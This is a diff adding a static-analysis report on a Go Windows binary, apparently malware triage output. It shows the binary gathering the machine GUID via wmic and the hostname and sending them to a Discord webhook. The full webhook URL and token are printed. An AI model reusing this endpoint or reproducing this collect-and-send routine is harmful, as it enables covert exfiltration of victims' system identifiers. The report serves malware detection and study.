@@ -1,0 +1,39 @@
+main.main
+  0x6493d1 -> main.getWindowsGUID
+  0x649490 -> os.Exit
+  0x6494a5 -> main.getComputerName
+  0x64960f -> os.Exit
+  0x649a2a -> main.SendToDiscord("https://discord.com/api/webhooks/1219334162096455803/PfouPEyl34XHeXsfIh-2lxZi9UYYvGbFt06jYcl6nZCWfgiS5t7wkdr9OV8i0EurFWA9")
+main.getWindowsGUID
+  0x649002 -> os/exec.Command("wmic")
+  0x649051 -> os/exec.(*Cmd).Run
+  0x6490a2 -> strings.TrimSpace("<nil>")
+main.getComputerName
+  0x64910b -> os/exec.Command("hostname")
+  0x649160 -> os/exec.(*Cmd).Run
+  0x6491b3 -> strings.TrimSpace("<nil>")
+main.SendToDiscord
+  0x64924f -> encoding/json.Marshal
+  0x6492e6 -> net/http.(*Client).Post
+
+Semantic analysis
+  assessment_hints:
+    - Reachable code references suspicious high-entropy or magic-containing data blobs.
+    - Reachable functions contain byte transformation loops that may decode strings, configs, or payloads at runtime.
+  mid_function_control_transfers:
+    - main.main:0x6494d3 call -> runtime.duffzero+0x150 classification=go_runtime_duff_helper
+  suspicious_data_blobs:
+    - blob_0 .data:0x88a000 size=0x2000 entropy=7.995 reasons=high_entropy refs=<none>
+    - blob_1 .data:0x895000 size=0x1000 entropy=7.51 reasons=high_entropy refs=<none>
+    - blob_2 .data:0x89b000 size=0x3000 entropy=7.955 reasons=high_entropy refs=<none>
+    - blob_3 .data:0x8ad000 size=0x1000 entropy=3.364 reasons=referenced_by_reachable_code,contains_magic_bytes refs=main.SendToDiscord
+    - blob_4 .rdata:0x6cc000 size=0x1000 entropy=4.888 reasons=contains_magic_bytes refs=<none>
+    - blob_5 .rdata:0x6cf000 size=0x16000 entropy=7.961 reasons=contains_magic_bytes,high_entropy refs=<none>
+    - blob_6 .rdata:0x738000 size=0x1000 entropy=4.63 reasons=contains_magic_bytes refs=<none>
+    - blob_7 .rdata:0x7cc000 size=0x1000 entropy=4.522 reasons=contains_magic_bytes refs=<none>
+    - blob_8 .rdata:0x852000 size=0x1000 entropy=4.299 reasons=contains_magic_bytes refs=<none>
+    - blob_9 .rdata:0x865000 size=0x1000 entropy=4.373 reasons=contains_magic_bytes refs=<none>
+  data_transformers:
+    - main.getWindowsGUID ops=add,bytes_to_string,shift,sub,xor confidence=medium sources=<unknown>
+    - main.getComputerName ops=add,bytes_to_string,shift,sub,xor confidence=medium sources=<unknown>
+    - main.SendToDiscord ops=add,sub,xor confidence=medium sources=blob_3
